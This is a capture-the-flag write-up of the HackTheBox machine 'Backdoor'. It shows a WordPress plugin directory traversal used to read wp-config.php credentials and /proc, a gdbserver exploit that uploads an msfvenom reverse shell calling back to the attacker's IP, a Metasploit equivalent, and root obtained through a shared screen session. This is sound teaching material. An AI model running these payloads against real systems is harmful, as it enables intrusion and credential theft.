---
title: HTB: Backdoor
url: https://0xdf.gitlab.io/2022/04/23/htb-backdoor.html
date: 2022-04-23T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-backdoor, ctf, hackthebox, nmap, wordpress, wpscan, feroxbuster, exploit-db, directory-traversal, ebooks-download, proc, bash, msfvenom, gdb, gdbserver, gdb-remote, metasploit, screen, htb-pressed, oscp-plus-v2
---

![Backdoor](https://0xdfimages.gitlab.io/img/backdoor-cover.png)

Backdoor starts by finding a WordPress plugin with a directory traversal bug that allows me to read files from the filesystem. I’ll use that to read within the /proc directory and identify a previously unknown listening port as gdbserver, which I’ll then exploit to get a shell. To get to root, I’ll join a screen session running as root in multiuser mode.

## Box Info

| Name | [Backdoor](https://hackthebox.com/machines/backdoor)  [Backdoor](https://hackthebox.com/machines/backdoor) [Play on HackTheBox](https://hackthebox.com/machines/backdoor) |
| --- | --- |
| Release Date | [20 Nov 2021](https://twitter.com/hackthebox_eu/status/1461007660535459845) |
| Retire Date | 23 Apr 2022 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Backdoor |
| Radar Graph | Radar chart for Backdoor |
| First Blood User | 00:20:35[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 00:33:17[snowscan snowscan](https://app.hackthebox.com/users/9267) |
| Creator | [hkabubaker17 hkabubaker17](https://app.hackthebox.com/users/79623) |

## Recon

### nmap

`nmap` finds three open TCP ports, SSH (22), HTTP (80), and something unknown on 1337:

```

oxdf@hacky$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.125
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 16:53 UTC
Nmap scan report for 10.10.11.125
Host is up (0.100s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
oxdf@hacky$ nmap -p 22,80,1337 -sCV -oA scans/nmap-tcpscripts 10.10.11.125
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 16:55 UTC
Nmap scan report for 10.10.11.125
Host is up (0.091s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: WordPress 5.8.1
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_https-redirect: ERROR: Script execution failed (use -d to debug)
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.25 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 focal.

### TCP 1337

The `nmap` scan and scripts were not able to get anything out of port 1337. I’ll try a couple manual checks, like connecting with `nc` and sending random text, and `curl`, but nothing ever comes back.

```

oxdf@hacky$ nc -v 10.10.11.125 1337
Connection to 10.10.11.125 1337 port [tcp/*] succeeded!
hello
test
^C
oxdf@hacky$ curl 10.10.11.125:1337
^C

```

I’ll have to come back to this later.

### Website - TCP 80

#### Site

The site is for an art muesum but is mostly just a default HTML template:

[![image-20220420130147369](https://0xdfimages.gitlab.io/img/image-20220420130147369.png)](https://0xdfimages.gitlab.io/img/image-20220420130147369.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220420130147369.png)

The “About” and “Contact” links lead to other static pages with default template text. The “Blog” link as well, and there’s one post by admin. The “Home” link points to `backdoor.htb`, so I’ll add that to `/etc/hosts` and scan for sub domains with `wfuzz`, but not find any.

#### Tech Stack

The bottom of the page does say “Proudly powered by WordPress”. There’s not much interesting to report from the headers or looking at any source.

WordPress is written in PHP, though trying `index.php` actually leads to redirects. This makes sense, as WordPress does manage URL routes differently than a static site with PHP pages.

#### wpscan

I’ll run `wpscan` on the host. The scan I typically run finished in about a minute, and doesn’t find much:

```

oxdf@hacky$ wpscan -e ap,t,tt,u --url http://backdoor.htb --api-token $WPSCAN_API
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|              

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.20
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://backdoor.htb/ [10.10.11.125]
...[snip]...

```

XMLRPC is enabled, which I go into detail on in [Pressed](/2022/02/03/htb-pressed.html#background):

```

...[snip]...
[+] XML-RPC seems to be enabled: http://backdoor.htb/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
...[snip]... 

```

That’s worth keeping in mind if I want to try to brute force creds for an account or have access to an account without GUI access.

There’s several CVEs in the WordPress code that are called out. A bunch aren’t interesting (expired root cert, prototype pollution, even stored XSS (at least not at this point)). There’s two SQL injections (CVE-2022-21661 and CVE-2022-21664), but I couldn’t find good detail on either.

It doesn’t find any plugins:

```

...[snip]...
[+] Enumerating All Plugins (via Passive Methods)
[i] No plugins Found.
...[snip]...

```

And nothing else is interesting.

It’s worth starting in the background a more aggressive scan to try to brute force plugins, which I’ll do with `--plugins-detection aggressive`. This takes half an hour to complete, but finds two plug-ins::

```

oxdf@hacky$ wpscan -e ap --plugins-detection aggressive --url http://backdoor.htb --api-token $WPSCAN_API
...[snip]...
[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:31:27 <============================================================================================================================================================================================> (97783 / 97783) 100.00% Time: 00:31:27
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:                                          

[+] akismet
 | Location: http://backdoor.htb/wp-content/plugins/akismet/
 | Latest Version: 4.2.2
 | Last Updated: 2022-01-24T16:11:00.000Z
 |                       
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/akismet/, status: 403
 |                      
 | [!] 1 vulnerability identified:
 |                      
 | [!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
 |     Fixed in: 3.1.5     
 |     References:        
 |      - https://wpscan.com/vulnerability/1a2f3094-5970-4251-9ed0-ec595a0cd26c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-9357
 |      - http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
 |      - https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
 |
 | The version could not be determined.
[+] ebook-download
 | Location: http://backdoor.htb/wp-content/plugins/ebook-download/
 | Last Updated: 2020-03-12T12:52:00.000Z
 | Readme: http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | [!] The version is out of date, the latest version is 1.5
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/, status: 200
 |
 | [!] 1 vulnerability identified:
 |
 | [!] Title: Ebook Download < 1.2 - Directory Traversal
 |     Fixed in: 1.2
 |     References:
 |      - https://wpscan.com/vulnerability/13d5d17a-00a8-441e-bda1-2fd2b4158a6c
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10924
 |
 | Version: 1.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
...[snip]...

```

The directory traversal in Ebook Download is particularly interesting.

#### Alternative Plugins Brute

If I didn’t want to use `wpscan` to enumerate WordPress plugins, I could also try a wordlist like [this one](https://raw.githubusercontent.com/Perfectdotexe/WordPress-Plugins-List/master/plugins.txt) with `feroxbuster`:

```

oxdf@hacky$ feroxbuster -u http://backdoor.htb/wp-content/plugins -w plugins.txt 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://backdoor.htb/wp-content/plugins
 🚀  Threads               │ 50
 📖  Wordlist              │ plugins.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c http://backdoor.htb/wp-content/plugins/akismet
301      GET        9l       28w      340c http://backdoor.htb/wp-content/plugins/ebook-download => http://backdoor.htb/wp-content/plugins/ebook-download/
[####################] - 3m    160172/160172  0s      found:2       errors:1      
[####################] - 2m     80086/80086   508/s   http://backdoor.htb/wp-content/plugins 
[####################] - 2m     80086/80086   516/s   http://backdoor.htb/wp-content/plugins/ebook-download 

```

It finds the same two plugins, which I could then research and find exploits for.

#### Alternative Plugins Discovery

After finding the plugins as described above, someone pointed out to me that the `/wp-content/plugins/` directory on Backdoor has directory listing enabled. That is not the default case, and WordPress typically puts an empty `index.php` in this directory to prevent just this kind of data leak. But it is the case here, which means that no brute force is necessary:

![image-20220421134550682](https://0xdfimages.gitlab.io/img/image-20220421134550682.png)

This is plenty to identify the Ebook Download plugin, and clicking on the folder shows the contents including the `readme.txt` with the version as well as the rest of the plugin files.

## Shell as user

### Local File Read

#### Background

The links from `wpscan` don’t give a POC, but a quick Google search for Ebooks-Download directory traversal finds [this exploit-db](https://www.exploit-db.com/exploits/39575) post. It shows that the version can be disclosed with `http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt` (which is what’s referenced in the `wpscan` results), and that the POC is to visit `/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`.

Just looking at the POC, it looks like the `ebookdownloadurl` accepts a local path which probably wasn’t what the author intended.

#### POC

I’ll manually check the version just to verify:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/readme.txt
=== Plugin Name ===                               
Contributors: zedna                                                 
Donate link: https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=3ZVGZTC7ZPCH2&lc=CZ&item_name=Zedna%20Brickick%20Website&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donateCC_LG%2egif%3aNonHosted
Tags: ebook, file, download                                         
Requires at least: 3.0.4         
Tested up to: 4.4                             
Stable tag: 1.1 
...[snip]...

```

The “Stable tag” of 1.1 shows a vulnerable version.

I’m able to read the `wp-config.php` file just like the POC suggests, including the database connection information:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
../../../wp-config.php../../../wp-config.php../../../wp-config.php<?php
/**
 * The base configuration for WordPress
...[snip]...
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
...[snip]...

```

I can try to log into WordPress at`http://backdoor.htb/wp-login.php` with the username admin and wordpressuser, but neither work.

#### Filesystem Enumeration

The challenge with directory traversal / file read vulns is that you typically can’t list directories, only access files I know to exist.

`/etc/passwd` will provide a list of users:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../etc/passwd
../../../../../../../etc/passwd../../../../../../../etc/passwd../../../../../../../etc/passwdroot:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...[snip]...
user:x:1000:1000:user:/home/user:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false
<script>window.close()</script>

```

I can try the DB password with user and root over SSH, but it doesn’t work.

Apache configs is something I can try to grab. `/etc/apache2/sites-enabled/000-default.conf` doesn’t returns anything, but `backdoor.htb.conf` does (comments removed):

```

<VirtualHost *:80>

        ServerName backdoor.htb
        ServerAlias *
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

<script>window.close()</script>

```

Still, nothing interesting.

### Process Enumeration

#### Strategy

Especially in light of the unknown service running on 1337, I’d like to get a list of the processes running on the system. I can take a look at `/proc`, which has a directory for each process id (pid) currently running. For example, on my VM:

```

oxdf@hacky$ ls /proc/
1     109   12    130   1756  1820  1957  2070  2149  2194  224   2286  2431   28422  36    41     441  520    70500  766    786    79395  800    83982  913  97          cpuinfo        fs          kpagecgroup  mtrr          stat           version_signature
10    11    1203  131   1767  1825  1962  2075  2152  2197  2242  2291  2437   29     37    412    442  52570  70501  767    78741  79398  80168  84355  92   98          crypto         interrupts  kpagecount   net           swaps          vmallocinfo
100   111   1204  1336  1784  187   1964  2106  2154  22    225   23    2458   3      38    417    444  52571  70506  770    78742  79402  80173  84439  928  999         devices        iomem       kpageflags   pagetypeinfo  sys            vmstat
1002  112   1205  136   1786  19    1967  2110  2156  220   2254  2321  2478   30     386   41868  445  562    70507  772    78834  79567  80198  85154  93   acpi        diskstats      ioports     loadavg      partitions    sysrq-trigger  zoneinfo
102   113   1206  137   1797  190   1968  2114  2163  2208  2257  2335  25     31     39    42     447  5643   70508  774    78837  79627  802    85332  939  bootconfig  dma            irq         locks        pressure      sysvipc
1026  114   1207  14    18    191   1970  2116  2178  221   226   2343  2562   32     4     427    448  570    70509  775    790    79655  80214  85354  94   buddyinfo   driver         kallsyms    mdstat       schedstat     thread-self
1029  115   1208  15    1802  193   2     2123  2181  222   227   2353  2570   328    40    43     449  582    70510  78486  79065  79692  80228  85575  95   bus         dynamic_debug  kcore       meminfo      scsi          timer_list
104   116   1230  16    1803  1943  20    2135  2185  2223  228   2382  26     329    402   436    477  6      70511  78488  79069  79784  80458  85634  952  cgroups     execdomains    keys        misc         self          tty
105   117   127   160   1808  1945  2056  2142  2188  223   2284  2393  28     34     403   438    479  670    75954  78493  793    79870  80533  9      96   cmdline     fb             key-users   modules      slabinfo      uptime
107   1185  13    17    1809  1955  2061  2146  219   2234  2285  24    28408  35     4083  44     482  673    75979  785    79388  799    812    91     963  consoles    filesystems    kmsg        mounts       softirqs      version

```

There’s also the `self` folder, which is a symbolic link to the pid of the current process. Again, from my VM:

```

oxdf@hacky$ ls -l /proc/self
lrwxrwxrwx 1 root root 0 Apr 18 21:38 /proc/self -> 85664

```

In each numbered folder, the `cmdline` file has the command line user to run the process:

```

oxdf@hacky$ cat /proc/self/cmdline
cat/proc/self/cmdline

```

It’s worth noting that there’s no space between `cat` and the path. `xxd` make this clear:

```

oxdf@hacky$ cat /proc/self/cmdline | xxd
00000000: 6361 7400 2f70 726f 632f 7365 6c66 2f63  cat./proc/self/c
00000010: 6d64 6c69 6e65 00                        mdline.

```

The program and the arguments are actually separated by a null byte. I’ll keep that in mind.

#### POC on Backdoor

On Backdoor, I can do the same thing:

```

oxdf@hacky$ curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.

```

`curl` is not happy about putting binary data to the command line. I’ll force it with `-o-`, and use `xxd` to look at the results:

```

oxdf@hacky$ curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline -o- | xxd
00000000: 2e2e 2f2e 2e2f 2e2e 2f2e 2e2f 2e2e 2f2e  ../../../../../.
00000010: 2e2f 2e2e 2f70 726f 632f 7365 6c66 2f63  ./../proc/self/c
00000020: 6d64 6c69 6e65 2e2e 2f2e 2e2f 2e2e 2f2e  mdline../../../.
00000030: 2e2f 2e2e 2f2e 2e2f 2e2e 2f70 726f 632f  ./../../../proc/
00000040: 7365 6c66 2f63 6d64 6c69 6e65 2e2e 2f2e  self/cmdline../.
00000050: 2e2f 2e2e 2f2e 2e2f 2e2e 2f2e 2e2f 2e2e  ./../../../../..
00000060: 2f70 726f 632f 7365 6c66 2f63 6d64 6c69  /proc/self/cmdli
00000070: 6e65 2f75 7372 2f73 6269 6e2f 6170 6163  ne/usr/sbin/apac
00000080: 6865 3200 2d6b 0073 7461 7274 003c 7363  he2.-k.start.<sc
00000090: 7269 7074 3e77 696e 646f 772e 636c 6f73  ript>window.clos
000000a0: 6528 293c 2f73 6372 6970 743e            e()</script>

```

It seems to print the given parameter three times, then without a break the results, which includes `\x00` where I would want spaces. Then it ends in `<script>window.close()</script>`.

I can use `tr` to [replace the nulls with whitespace](https://stackoverflow.com/a/42592972), and `cut` to remove the beginning and end:

```

oxdf@hacky$ curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../proc/self/cmdline | tr '\000' ' ' | cut -c115- | rev | cut -c32- | rev
/usr/sbin/apache2 -k start

```

The breaks down as:
- `tr '\000' ' '` - replace nulls with spaces
- `cut -c115-` start at character 115 and print the rest. I’ll note that 115 is three times the length of the parameter plus 1.
- `rev | cut -c32- | rev` - reverse the string, start 32 characters in, and then reverse again, effectively removing the last 31 characters.

This traversal also works with absolute paths, so `ebookdownloadurl=/proc/self/cmdline`.

#### Bash Script

I can make a quick Bash script from this to loop over a range of pids and try to find processes:

```

#!/bin/bash

for i in $(seq 1 50000); do

    path="/proc/${i}/cmdline"
    skip_start=$(( 3 * ${#path} + 1))
    skip_end=32

    res=$(curl -s http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=${path}ne -o- | tr '\000' ' ')
    output=$(echo $res | cut -c ${skip_start}- | rev | cut -c ${skip_end}- | rev)
    if [[ -n "$output" ]]; then
        echo "${i}: ${output}"
    fi

done

```

This effectively does what I showed above, capturing the results with nulls replaced in `res`, then cutting the start and end and saving as `output`, and finally printing the pid and the command line if it’s there.

This is a bit slow, but good enough to do the job. I hope to come back and do a post and/or video on parallelizing this in the future.

The script clears the first 1000 processes in a minute or so, which is enough to spot PID 851:

```

oxdf@hacky$ ./brute_processes.sh  
1: /sbin/init auto automatic-ubiquity noprompt 
486: /lib/systemd/systemd-journald 
512: /lib/systemd/systemd-udevd 
529: /lib/systemd/systemd-networkd 
...[snip]...
826: /usr/sbin/cron -f 
829: /usr/sbin/CRON -f 
830: /usr/sbin/CRON -f 
851: /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done 
853: /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done 
865: /usr/sbin/atd -f 
867: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
887: /usr/sbin/apache2 -k start 
898: /usr/lib/accountsservice/accounts-daemon 
...[snip]...

```

This process is:

```

/bin/sh -c while true;
    do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; 
done

```

It’s running `gdbserve` as user in a loop on port 1337.

### Exploit gdbserver

#### Upload Rev Shell Elf

Hacktricks has a [page](https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver) on exploiting `gdbserver`. I suspect at least the first technique was tested on Backdoor (given the use of port 1337 and the location of `/home/user`). This technique is to create an elf, and then upload it to the remote debugger and run it there.

I’ll create a simple reverse shell payload with `msfvenom`:

```

oxdf@hacky$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 PrependFork=true -f elf -o rev.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Final size of elf file: 226 bytes
Saved as: rev.elf

```

Next, I’ll start debugging it locally:

```

oxdf@hacky$ gdb -q rev.elf 
Reading symbols from rev.elf...
(No debugging symbols found in rev.elf)
(gdb)

```

Now connect to the remote server:

```

(gdb) target extended-remote 10.10.11.125:1337
Remote debugging using 10.10.11.125:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /lib64/ld-2.31.so from remote target...
Reading /lib64/.debug/ld-2.31.so from remote target...
Reading /usr/lib/debug//lib64/ld-2.31.so from remote target...
Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2

```

With that connection, I can upload the binary:

```

(gdb) remote put rev.elf /dev/shm/rev
Successfully sent file "rev.elf".

```

Now I just need to set the remote debugging target to that file, and run it:

```

(gdb) set remote exec-file /dev/shm/rev
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program:  
Reading /dev/shm/rev from remote target...
Reading /dev/shm/rev from remote target...
Reading symbols from target:/dev/shm/rev...
(No debugging symbols found in target:/dev/shm/rev)
[Detaching after fork from child process 33603]
[Inferior 1 (process 33592) exited normally]

```

When that finishes, there’s a connection at my listening `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.125 46586
id
uid=1000(user) gid=1000(user) groups=1000(user)

```

I’ll do a shell upgrade with `script`:

```

script /dev/null -c bash
Script started, file is /dev/null
user@Backdoor:/home/user$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo ; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
user@Backdoor:/home/user$

```

I’m told that there may be issues running `gdb` with a different version than the server. I didn’t have any issues, but in this case my VM and the target are both Ubuntu 20.04. If you have issues from Kali or Parrot, that may be the problem.

I can also grab `user.txt`:

```

user@Backdoor:/home/user$ cat user.txt
0d183e76************************

```

#### With MSF

The simpler way to exploit this is using Metasploit. I’ll start `msfconsole`, and find the exploit:

```

oxdf@hacky$ msfconsole 
...[snip]...
msf6 > search gdb

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/gdb/gdb_server_exec               2014-08-24       great      No     GDB Server Remote Payload Execution
   1  exploit/linux/local/ptrace_sudo_token_priv_esc  2019-03-24       excellent  Yes    ptrace Sudo Token Privilege Escalation

Interact with a module by name or index. For example info 1, use 1 or use exploit/linux/local/ptrace_sudo_token_priv_esc

msf6 > use 0
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) >

```

I’ll configure it by setting the `rhosts`, `rport`, and `lhost`:

```

msf6 exploit(multi/gdb/gdb_server_exec) > options

Module options (exploit/multi/gdb/gdb_server_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXE_FILE  /bin/true        no        The exe to spawn when gdbserver is not attached to a process.
   RHOSTS    10.10.11.125     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     1337             yes       The target port (TCP)

Payload options (linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  tun0             yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   x86_64 (64-bit)

```

Running it returns a shell:

```

msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.10.14.6:4444 
[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
[*] 10.10.11.125:1337 - Stepping program to find PC...
[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.10.11.125:1337 - Executing the payload...
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.11.125:58140 ) at 2022-04-20 20:38:51 +0000

id
uid=1000(user) gid=1000(user) groups=1000(user)

```

## Shell as root

### Enumeration

Looking through the processes earlier, another one jumps out. From a shell, it’s easier to see:

```

user@Backdoor:/home/user$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...[snip]...
root         853  0.0  0.0   2608  1828 ?        Ss   16:43   0:05 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
...[snip]...

```

Something is running `screen` as root (in a loop) as root:

```

/bin/sh -c while true;
    do sleep 1;
    find /var/run/screen/S-root/ -empty -exec screen -dmS root \;
done

```

I suspect the loop is to make this exploitable for HTB, idea is to similar as if the admin is logged in with a screen session.

### Screen

#### Background

`screen` is a terminal multiplexer, which allows a user to open multiple windows from within a session and keep those windows running even when the user isn’t around or connected (they will go away at reboot).

#### Screen Configuration

In general, it’s not possible to log into other user’s screen sessions. However, there are configurations that allow that, and that happens to be what I’ll exploit here.

I would typically look at this in Beyond Root, but too many people are going to look at Backdoor and assume it’s typical to just own `screen` by hoping into another user’s session. That is not a default case, as it has to be configured a very specific way.

First, let’s look at how `screen` is being `invoked`. There’s a cron running `find /var/run/screen/S-root/ -empty -exec screen -dmS root ;\`. When a session is created, `screen` creates a folder in `/var/run/screen/S-[username]/[sesison id].[session name]`. The `-empty` flag tells `find` to only return empty directories or files. So it will only return something if that `S-root` folder is empty, which means there is no session. If that is the case (there’s no `screen` session in `S-root`), it will run `screen` to start one.

It runs `screen` with three args, and the [man page](https://linux.die.net/man/1/screen) shows:
- `-D -m` (which also covers `-dm`) - starts screen in “detached mode”, and doesn’t fork a new process. If the session ends, it exits as well.
- `-S root` - names the session, in this case, “root”

This on it’s own is not enough for another user to try to connect to the session. [This StackExchange answer](https://unix.stackexchange.com/a/163878/369627) talks about how to set up `screen` in multiuser mode. Once inside the session, the user needs to `multiuser on` and add the user that can connect to an access control list. As root, I can see this is done in `/root/.screenrc` (which runs each time `screen` starts):

```

multiuser on                                                                    
acladd user                                                                     
shell -/bin/bash

```

It also notes in that post that `screen` must be SUID for this to work. It isn’t on my Ubuntu 20.04 machine by default, but I understand that some distros do ship with it that way (I remember seeing it as a SUID binary on a certain 24-hour exam I took in 2018).

Because `screen` is configured exactly this way, I can exploit it as follows.

#### Screen Sessions

Running `screen -ls` will show sessions for the current user:

```

user@Backdoor:/home/user$ screen -ls
No Sockets found in /run/screen/S-user.

```

The process is running as root, so I’ll try to tell `screen` to look in `S-root`. Adding `root/` to the end of the command works:

```

user@Backdoor:/home/user$ screen -ls S-root/
Cannot identify account 'S-root'.
user@Backdoor:/home/user$ screen -ls root/
There is a suitable screen on:
        947.root        (04/20/22 16:43:20)     (Multi, detached)
1 Socket in /run/screen/S-root.

```

Interestingly, it does require the trailing `/`.

#### Connect to screen Session

I’ll connect to that session using `-x` and the `[user]/[session id]`:

```

user@Backdoor:/home/user$ screen -x root/37344              
Please set a terminal type.

```

It complains about a missing terminal type. That’s typically set in an environment variable. I’ll add that to the front of the command, and on running `TERM=screen screen -x root/37344`, I’m dropped into a `screen` session as root:

```

root@Backdoor:~#                                                                

```

It also works using the `[user]/[session name]`, so in this case, `TERM=screen screen -x root/root`.

I can read `root.txt`:

```

root@Backdoor:~# cat root.txt
499d4ef0************************

```

[Parallelizing Bash and Python »](/2022/04/24/parallelizing-in-bash-and-python.html)